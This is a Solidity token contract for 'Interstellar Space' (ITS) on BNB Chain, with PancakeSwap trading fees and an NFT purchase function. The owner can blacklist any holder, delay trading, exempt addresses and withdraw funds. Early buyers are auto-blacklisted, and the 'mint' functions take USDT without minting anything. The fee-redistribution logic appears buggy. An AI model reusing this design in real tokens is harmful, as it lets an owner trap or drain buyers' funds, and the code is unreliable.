/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IFomo{
    function withdraw(uint256 amount) external;

    function withdrawToken(IERC20 __token, uint256 amount) external;

    function transferOwnership(address newOwner) external;
}

contract InterstellarSpaceToken is
    IERC20
{
    address public __owner;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    address public pair;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public marketAddress = 0x0D84C154D3E063D0E70bde29BC997ee605ABEc35;
    address public PancakeFactoryAddress;
    IPancakeRouter02 internal uniswapV2Router;
    IERC20 private c_usdt;
    mapping (address => bool) public isBlacklist;
    mapping (address => bool) public isExcludedFromFees;
    uint256 public tradingEnabledTimestamp;
    uint256 public blockNumTime = uint256(6);
    uint256 public totalRatio = uint256(10000);
    uint256 public fundRatio;
    uint256 public awardRatio;
    string private tokenName;
    string private tokenSymbol;
    uint8 private tokenDecimal;
    IFomo public Fomo = IFomo( 0x53E2dbc84734dbCFB8002F09e8512C73cf80E9d5 );
    uint256 public contractDecimal = uint256(18);
    uint256 public NFTPrice = uint256(10**16);
    struct ManagerData{
        uint256 amount;
        bool _isExists;
    }
    mapping(address => ManagerData) public _ManagerMap;
    uint256 managerRatio = uint256(1500);
    uint256 cardRatio = uint256(400);
    uint256 rankingRatio = uint256(100);

    uint256 boomLimit = uint256(86183999999667);
    uint256 public startBlock;
    
    
    constructor(
    )
        payable
    {
        __owner = msg.sender;
        tokenDecimal = 18;
        isExcludedFromFees[msg.sender] = true;
        tradingEnabledTimestamp = block.timestamp;
        uniswapV2Router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        c_usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
        uint256 total = uint256(9000000)*10**tokenDecimal;
        fundRatio = uint256(200);
        awardRatio = uint256(100);
        tokenName = "Interstellar Space";
        tokenSymbol = "ITS";
        _balances[msg.sender] = total;
        _totalSupply = total;
        emit Transfer(address(0), msg.sender, total);
        PancakeFactoryAddress = uniswapV2Router.factory();
        address _pair = pairFor(PancakeFactoryAddress, address(this), address(c_usdt));
        pair = _pair;
        isExcludedFromFees[address(Fomo)] = true;
        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[address(deadAddress)] = true;
        startBlock = block.number;
    }

    event RechargeLog(address indexed _address, IERC20 _token, uint256 _amount);
    event BoomLog( uint256 _amount);
    event ManagerLog( uint256 _amount );
    event CardLog( uint256 _amount );
    event RankingLog( uint256 _amount );
    event AwardLog( uint256 _amount );

    modifier onlyOwner() {
        require(__owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function symbol() 
        external 
        view 
        returns (string memory)
    {
        return tokenSymbol;
    }

    function name() 
        external 
        view 
        returns (string memory)
    {
        return tokenName;
    }

    function decimals() 
        external 
        view 
        returns (uint8) 
    {
        return tokenDecimal;
    }

    function totalSupply() 
        public 
        view 
        override 
        returns (uint256) 
    {
        return _totalSupply;
    }

    function balanceOf(address account) 
        external 
        view 
        override 
        returns (uint256) 
    {
        return _balances[account];
    }

    function allowance(address owner, address spender) 
        external 
        view 
        override 
        returns (uint256) 
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) 
        external 
        override 
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) 
        internal 
    {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) 
        external 
        override 
        returns (bool) 
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) 
        external 
        override 
        returns (bool) 
    {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transferNormal(address sender, address recipient, uint256 amount) 
        private 
    {
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
    

    function swapUSDTForToken(uint256 tokenAmount)
        private 
    {
        address[] memory path = new address[](2);
        path[0] = address(c_usdt);
        path[1] = address(this);
        IERC20 token = IERC20(c_usdt);
        token.approve(address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(deadAddress),
            block.timestamp
        );
    }

    function _transfer(address sender, address recipient, uint256 amount) 
        internal 
    {
        require(!isBlacklist[sender] && !isBlacklist[recipient], "in blacklist");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        //如果发送地址是当前地址，目标地址是交易对地址
        address _pair = pair;
        if(isExcludedFromFees[sender] || isExcludedFromFees[recipient]) {
            _transferNormal(sender, recipient, amount);
            return;
        }
        require(block.timestamp >= tradingEnabledTimestamp, "trade not open");
        if(block.timestamp <= tradingEnabledTimestamp + blockNumTime) {
            if(sender != _pair && sender != address(uniswapV2Router)) {
                isBlacklist[sender] = true;
            }
            if(recipient != _pair && recipient != address(uniswapV2Router)) {
                isBlacklist[recipient] = true;
            }
        }
        if( sender != _pair && recipient != _pair ){
            _transferNormal(sender, recipient, amount);
            return;
        }
        uint256 fundAmount = amount * fundRatio / totalRatio;
        uint256 awardAmount = amount * awardRatio / totalRatio;
        _balances[address(Fomo)] += fundAmount;
        emit Transfer(sender, address(Fomo), fundAmount);
        _balances[address(marketAddress)] += awardAmount;
        emit Transfer(sender, address(marketAddress), awardAmount);
        //太阳卡分红
        emit AwardLog( awardAmount );
        uint256 receiveAmount = amount - fundAmount - awardAmount;
        _balances[recipient] += receiveAmount;
        emit Transfer(sender, recipient, receiveAmount);
        //检查FOMO地址token价值
        IERC20 currentToken = IERC20(this);
        uint256 fomoAmount = currentToken.balanceOf( address(Fomo) );
        uint256 fomoPrice = fomoAmount / (10**currentToken.decimals()) * getPrice();
        if( fomoPrice >= boomLimit ){
            emit BoomLog( fomoAmount );
            Fomo.withdrawToken( IERC20(this), fomoAmount );
            _balances[address(this)] -= fomoAmount;
            _balances[address(marketAddress)] += fomoAmount;
            emit Transfer( address(Fomo), address(marketAddress), fomoAmount);
        }
    }

    function pairFor(address factory, address tokenA, address tokenB) 
        internal 
        pure 
        returns (address pair_) 
    {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair_ = address(uint160(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5'
        )))));
    }

    function getLastBlockNumber()
        external
        view
        returns(uint256)
    {
        return block.number;
    }

    //获取交易对价格
    function getPrice()
        public
        view
        returns (uint256 _price)
    {
        IPancakePair pairData = IPancakePair(pair);
        (uint112 token0LP,uint112 token1LP,uint256 timestemp) = pairData.getReserves();
        if( token0LP == uint112(0) ||  token1LP == uint112(0) ){
            return 0;
        }
        //校验
        if( address(pairData.token0()) == address(this)){
            return token1LP * 10 ** contractDecimal / token0LP ;
        }else{
            return token0LP * 10 ** contractDecimal / token1LP ;
        }
    }

    //购买方法
    function buyMethod( uint256 times )
        internal
    {
        IERC20 token = IERC20(c_usdt);
        address _sender = msg.sender;
        uint256 amount = times * NFTPrice;
        token.transferFrom(_sender, address(this), amount );
        emit RechargeLog(msg.sender, token, times);
        uint256 managerAmount = amount * managerRatio / totalRatio;
        uint256 cardAmount = amount * cardRatio / totalRatio;
        uint256 rankingAmount = amount * rankingRatio / totalRatio;
        token.transfer(marketAddress, managerAmount + cardAmount + rankingAmount);
        emit CardLog( cardAmount );
        emit RankingLog( rankingAmount );
        emit ManagerLog( managerAmount );
        uint256 swapAmount = amount - managerAmount - cardAmount - rankingAmount;
        swapUSDTForToken(swapAmount);
        if( _ManagerMap[_sender]._isExists ){
            _ManagerMap[_sender].amount += amount;
        }else{
            _ManagerMap[_sender].amount =  amount;
            _ManagerMap[_sender]._isExists = true;
        }
    }

    //铸造NFT
    function mintNFT()
        external
        returns( bool res)
    {
        buyMethod(1);
        return true;
    }

    //铸造NFT
    function mintBatchNFT( uint256 cardAmount )
        external
        returns( bool res )
    {
        buyMethod( cardAmount );
        return true;
    }

    function setTrade(uint256 t) 
        external 
        onlyOwner 
    {
        tradingEnabledTimestamp = t;
    }

    function setBlockNumTime(uint256 b)
        external 
        onlyOwner 
    {
        blockNumTime = b;
    }

    function setExcludeFee(address a, bool b) 
        external 
        onlyOwner 
    {
        isExcludedFromFees[a] = b;
    }

    function setBlacklist(address a, bool b)
        external 
        onlyOwner 
    {
        isBlacklist[a] = b;
    }

    function withdrawCurrentToken(IERC20 __token, uint256 amount) 
        external
        onlyOwner
    {
        IERC20(__token).transfer(msg.sender, amount);
    }

    //修改合约owner
    function transferOwnership(address newOwner)
        external
        onlyOwner 
    {
        __owner = newOwner;
    }

    //修改fomo owner
    function transferFomoOwnership(address newOwner) 
        external
        onlyOwner 
    {
        Fomo.transferOwnership(newOwner);
    }

    function setFomo(IFomo newOwner)
        external
        onlyOwner
    {
        Fomo = IFomo(newOwner);
    }

    function setMarketAddress(address newMarket)
        external
        onlyOwner 
    {
        marketAddress = newMarket;
    }

    //设置NFT单价
    function setNFTPrice( uint256 newPrice )
        external
        onlyOwner 
    {
        NFTPrice = newPrice;
    }

    //设置爆破限额
    function setBoomLimit( uint256 newLimit )
        external
        onlyOwner 
    {
        boomLimit = newLimit;
    }

}